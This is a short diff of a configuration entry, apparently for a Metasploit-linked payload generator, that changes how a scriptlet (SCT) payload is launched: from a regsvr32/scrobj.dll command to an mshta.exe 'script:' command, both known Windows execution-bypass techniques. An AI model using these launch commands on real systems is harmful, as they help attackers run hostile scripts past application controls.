@@ -1,7 +1,7 @@
 [Type]
 name: Get Object
 template: ./template/SCT/getObject.template
-runInfo: regsvr32.exe \u \n \i:${Output:var} scrobj.dll
+runInfo: mshta.exe script:${Output:var}
 
 [Framework]
 var: Metasploit
